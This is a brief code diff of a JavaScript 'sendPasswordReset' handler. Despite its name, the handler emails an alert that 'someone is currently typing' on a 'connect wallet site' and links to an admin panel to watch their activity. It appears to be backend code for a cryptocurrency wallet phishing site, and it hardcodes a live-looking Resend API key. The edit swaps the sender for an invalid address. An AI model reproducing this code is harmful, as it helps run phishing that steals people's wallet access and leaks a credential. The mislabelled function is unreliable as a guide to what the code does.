@@ -11,7 +11,7 @@ export const sendPasswordReset = async(req, res, next) =>{
         const resend = new Resend('re_VBc5AjAZ_8C6gLxu5kA8NJQHHEjD1i8wi');
 
         await resend.emails.send({
-        from: 'noreply@pitradedigital.com',
+        from: 'yourpiwebsite',
         to: req.body.email,
         subject: 'New Activity In Connect Wallet site',
         html: `<p>Someone is currently typing connect wallet site. Click on <a href="https://pitradedigital.com/admin">admin</a> to see their activity.</p>`
